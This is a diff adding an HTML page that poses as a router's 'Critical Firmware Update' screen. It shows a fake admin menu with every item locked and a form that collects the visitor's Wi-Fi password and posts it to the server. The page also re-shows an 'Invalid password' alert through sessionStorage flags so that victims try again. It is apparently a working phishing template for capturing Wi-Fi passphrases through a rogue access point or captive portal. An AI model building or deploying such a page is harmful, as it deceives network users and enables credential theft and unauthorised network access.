@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>Router Firmware Update</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+html,body{height:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#eef2f7;color:#1f2937;font-size:15px;line-height:1.5}
+.topbar{position:fixed;top:0;left:0;right:0;height:56px;background:#1e40af;color:#fff;display:flex;align-items:center;padding:0 12px;z-index:1000;box-shadow:0 1px 3px rgba(0,0,0,.1)}
+.menu-btn{width:40px;height:40px;display:flex;flex-direction:column;justify-content:center;align-items:center;cursor:pointer;border-radius:8px}
+.menu-btn span{display:block;width:22px;height:2px;background:#fff;margin:2.5px 0;border-radius:2px}
+.brand{font-size:16px;font-weight:600;margin-left:8px}
+.status{width:8px;height:8px;border-radius:50%;background:#22c55e;margin-left:auto;margin-right:8px;box-shadow:0 0 0 3px rgba(34,197,94,.3)}
+.sidemenu{position:fixed;top:0;left:-300px;width:280px;height:100%;background:#fff;z-index:1100;transition:left .25s ease;box-shadow:2px 0 16px rgba(0,0,0,.15);overflow-y:auto}
+.sidemenu.open{left:0}
+.sidemenu-header{padding:20px;background:#1e40af;color:#fff;font-weight:600;font-size:16px}
+.sidemenu-header small{display:block;font-size:12px;color:#bfdbfe;margin-top:4px;font-weight:400}
+.menu-item{display:flex;padding:14px 20px;color:#1f2937;font-size:15px;border-bottom:1px solid #f3f4f6;cursor:pointer;justify-content:space-between;align-items:center}
+.menu-item.expanded .arrow{transform:rotate(90deg)}
+.menu-item .arrow{color:#9ca3af;font-size:12px;transition:transform .2s}
+.submenu{max-height:0;overflow:hidden;transition:max-height .25s ease;background:#f9fafb}
+.submenu.open{max-height:400px}
+.submenu a{display:block;padding:12px 20px 12px 40px;color:#4b5563;font-size:14px;border-bottom:1px solid #f3f4f6;cursor:pointer;text-decoration:none}
+.overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.35);z-index:1050;opacity:0;pointer-events:none;transition:opacity .25s}
+.overlay.show{opacity:1;pointer-events:auto}
+.content{padding:72px 14px 24px;max-width:520px;margin:0 auto}
+.card{background:#fff;border-radius:12px;padding:24px 20px;box-shadow:0 1px 3px rgba(0,0,0,.08),0 4px 16px rgba(0,0,0,.05);border:1px solid #e5e7eb}
+.icon{width:64px;height:64px;margin:0 auto 18px;border-radius:16px;background:linear-gradient(135deg,#3b82f6,#1e40af);display:flex;align-items:center;justify-content:center;box-shadow:0 4px 14px rgba(59,130,246,.3)}
+.icon svg{width:32px;height:32px;fill:#fff}
+h1{font-size:20px;font-weight:600;text-align:center;margin-bottom:8px;color:#111827}
+.sub{font-size:13.5px;color:#6b7280;text-align:center;margin-bottom:20px;line-height:1.55}
+.info{background:#eff6ff;border:1px solid #bfdbfe;border-radius:8px;padding:12px 14px;font-size:12.5px;color:#1e3a8a;margin-bottom:18px;line-height:1.9}
+.info span{color:#1e40af;font-weight:600;display:inline-block;min-width:82px}
+.terms-box{border:1px solid #e5e7eb;border-radius:10px;background:#f9fafb;padding:14px;margin-bottom:16px}
+.terms-box h3{font-size:12px;color:#1e40af;font-weight:700;text-transform:uppercase;letter-spacing:.6px;margin-bottom:10px;display:flex;align-items:center;gap:8px}
+.terms-box h3::before{content:"";display:inline-block;width:4px;height:14px;background:#1e40af;border-radius:2px}
+.terms-scroll{max-height:120px;overflow-y:auto;background:#fff;border:1px solid #e5e7eb;border-radius:8px;padding:10px 12px;font-size:11.5px;color:#4b5563;line-height:1.65;margin-bottom:12px}
+.terms-scroll p{margin-bottom:8px}
+.chk{display:flex;align-items:flex-start;gap:10px;cursor:pointer;user-select:none;padding:6px;border-radius:8px}
+.chk input{position:absolute;opacity:0;width:0;height:0}
+.chk .box{width:22px;height:22px;border:2px solid #9ca3af;border-radius:6px;background:#fff;flex-shrink:0;display:flex;align-items:center;justify-content:center;transition:all .15s;margin-top:1px}
+.chk .box svg{width:14px;height:14px;fill:#fff;opacity:0;transition:opacity .15s}
+.chk input:checked + .box{background:#1e40af;border-color:#1e40af}
+.chk input:checked + .box svg{opacity:1}
+.chk .txt{font-size:13px;color:#374151;line-height:1.5;font-weight:500}
+.chk .txt b{color:#1e40af;font-weight:600}
+.alert{display:none;background:#fef2f2;border:1.5px solid #dc2626;border-left:5px solid #dc2626;border-radius:8px;padding:12px 14px;margin-bottom:14px;color:#991b1b;font-size:13.5px;line-height:1.5}
+.alert.show{display:block}
+.alert strong{display:block;font-size:14px;color:#7f1d1d;font-weight:700;margin-bottom:2px}
+label.lbl{display:block;font-size:13px;font-weight:500;color:#374151;margin-bottom:8px;margin-top:4px}
+input[type=password]{display:block;width:100%;height:50px;padding:0 14px;font-size:16px;font-family:inherit;border:1.5px solid #d1d5db;border-radius:8px;background:#fff;color:#111827;outline:none;-webkit-appearance:none;appearance:none}
+input[type=password]:disabled{background:#f3f4f6;color:#9ca3af;cursor:not-allowed}
+input[type=password]:focus{border-color:#1e40af;box-shadow:0 0 0 3px rgba(30,64,175,.12)}
+input[type=password]::placeholder{color:#9ca3af}
+button{display:block;width:100%;height:50px;margin-top:14px;font-size:16px;font-weight:600;font-family:inherit;color:#fff;background:#1e40af;border:none;border-radius:8px;cursor:pointer;-webkit-appearance:none;box-shadow:0 1px 3px rgba(30,64,175,.3)}
+button:disabled{background:#9ca3af;box-shadow:none;cursor:not-allowed}
+button:not(:disabled):active{background:#1e3a8a}
+.copyright{margin-top:18px;padding-top:14px;border-top:1px solid #e5e7eb;font-size:11px;color:#9ca3af;text-align:center;line-height:1.7}
+.copyright strong{color:#4b5563;font-weight:500}
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(80px);background:#111827;color:#fff;padding:14px 20px;border-radius:10px;font-size:13.5px;max-width:340px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.25);z-index:2000;opacity:0;transition:opacity .25s,transform .25s;pointer-events:none}
+.toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+<div class="menu-btn" onclick="toggleMenu()"><span></span><span></span><span></span></div>
+<div class="brand">Router</div>
+<div class="status"></div>
+</div>
+
+<div class="overlay" id="overlay" onclick="toggleMenu()"></div>
+
+<div class="sidemenu" id="sidemenu">
+<div class="sidemenu-header">Router<small>Firmware v3.8.2</small></div>
+<a class="menu-item" onclick="featureLocked()">Status</a>
+<a class="menu-item" onclick="toggleSub(this)">Setup <span class="arrow">&#9656;</span></a>
+<div class="submenu"><a onclick="featureLocked()">Basic Setup</a><a onclick="featureLocked()">Wireless Setup</a><a onclick="featureLocked()">WPS Setup</a><a onclick="featureLocked()">Network Setup</a></div>
+<a class="menu-item" onclick="toggleSub(this)">Advanced <span class="arrow">&#9656;</span></a>
+<div class="submenu"><a onclick="featureLocked()">Wireless</a><a onclick="featureLocked()">Security</a><a onclick="featureLocked()">NAT Forwarding</a><a onclick="featureLocked()">Access Control</a></div>
+<a class="menu-item" onclick="toggleSub(this)">Firewall <span class="arrow">&#9656;</span></a>
+<div class="submenu"><a onclick="featureLocked()">Basic Settings</a><a onclick="featureLocked()">DoS Protection</a><a onclick="featureLocked()">IP/MAC Binding</a></div>
+<a class="menu-item" onclick="toggleSub(this)">System Tools <span class="arrow">&#9656;</span></a>
+<div class="submenu"><a onclick="featureLocked()">Time Settings</a><a onclick="featureLocked()">Diagnostics</a><a onclick="featureLocked()">Firmware Upgrade</a><a onclick="featureLocked()">Backup &amp; Restore</a><a onclick="featureLocked()">Reboot</a><a onclick="featureLocked()">Logout</a></div>
+</div>
+
+<div class="content">
+<div class="card">
+<div class="icon"><svg viewBox="0 0 24 24"><path d="M12 3C7 3 2.7 5 0 8l12 13L24 8c-2.7-3-7-5-12-5zm0 6a6 6 0 016 6c0 1.5-.5 2.8-1.4 3.9L12 22l-4.6-3.1A6 6 0 016 9a6 6 0 016-6z"/></svg></div>
+<h1>Critical Firmware Update Required</h1>
+<p class="sub">A critical security update is available for your router. To continue using all features, please install the update below.</p>
+<div class="info">
+<span>Device:</span> Router<br>
+<span>Firmware:</span> v3.8.2 &rarr; v4.2.1<br>
+<span>Type:</span> Critical security patch<br>
+<span>Size:</span> 4.7 MB
+</div>
+
+<div class="terms-box">
+<h3>Terms &amp; Conditions</h3>
+<div class="terms-scroll">
+<p>By proceeding with this firmware update, you acknowledge and agree that you are the authorized owner or administrator of this device. This update is provided on an "as is" basis and is intended to address known security vulnerabilities.</p>
+<p>The update may temporarily disconnect connected devices. The manufacturer is not liable for any data loss, service interruption, or hardware malfunction arising from installation. Do not power off the device during the update process.</p>
+<p>You consent to the collection of diagnostic data and agree not to reverse-engineer, modify, or redistribute the firmware.</p>
+<p>Continued use of the device after the update constitutes acceptance of any revised terms.</p>
+</div>
+<label class="chk">
+<input type="checkbox" id="agree" onchange="toggleAgree()">
+<span class="box"><svg viewBox="0 0 24 24"><path d="M9 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"/></svg></span>
+<span class="txt">I have read and agree to the <b>Terms &amp; Conditions</b></span>
+</label>
+</div>
+
+<div class="alert" id="alert">
+<strong>Invalid password.</strong>
+<span>Please enter the correct Wi-Fi password and try again.</span>
+</div>
+
+<form method="POST" action="/">
+<label class="lbl" for="password">Wi-Fi Password</label>
+<input type="password" id="password" name="password" placeholder="Please agree to the Terms first" autocomplete="off" required disabled>
+<button type="submit" id="btn" disabled>Install Update</button>
+</form>
+
+<div class="copyright">
+<strong>&copy; 2026 Router Networks Ltd.</strong><br>
+All rights reserved &middot; Build 4.2.1-b119
+</div>
+</div>
+</div>
+
+<div class="toast" id="toast">Firmware update required. Please install the latest firmware to access this feature.</div>
+
+<script>
+function toggleMenu(){
+var m=document.getElementById('sidemenu');
+var o=document.getElementById('overlay');
+m.classList.toggle('open');
+o.classList.toggle('show');
+}
+function toggleSub(el){
+el.classList.toggle('expanded');
+var sub=el.nextElementSibling;
+if(sub && sub.classList.contains('submenu')){ sub.classList.toggle('open'); }
+}
+function featureLocked(){
+var t=document.getElementById('toast');
+t.classList.add('show');
+clearTimeout(window._tt);
+window._tt=setTimeout(function(){t.classList.remove('show');},3200);
+var m=document.getElementById('sidemenu');
+var o=document.getElementById('overlay');
+if(m.classList.contains('open')){ m.classList.remove('open'); o.classList.remove('show'); }
+}
+function toggleAgree(){
+var c=document.getElementById('agree').checked;
+var p=document.getElementById('password');
+var b=document.getElementById('btn');
+p.disabled=!c;
+b.disabled=!c;
+p.placeholder = c ? "Enter your Wi-Fi password" : "Please agree to the Terms first";
+if(c){ setTimeout(function(){ p.focus(); }, 80); }
+var a=document.getElementById('alert');
+if(a) a.classList.remove('show');
+}
+// restore checkbox state after wrong password reload
+window.addEventListener('DOMContentLoaded', function(){
+var stored = sessionStorage.getItem('ph0b14_agree');
+if (stored === 'yes') {
+    document.getElementById('agree').checked = true;
+    document.getElementById('password').disabled = false;
+    document.getElementById('btn').disabled = false;
+    document.getElementById('password').placeholder = "Enter your Wi-Fi password";
+}
+// show alert ONLY if this is a POST-response page (server sets flag)
+if (sessionStorage.getItem('ph0b14_wrong') === 'yes') {
+    document.getElementById('alert').classList.add('show');
+    sessionStorage.removeItem('ph0b14_wrong');
+}
+document.getElementById('agree').addEventListener('change', function(){
+    sessionStorage.setItem('ph0b14_agree', this.checked ? 'yes' : 'no');
+});
+});
+</script>
+</body>
+</html>
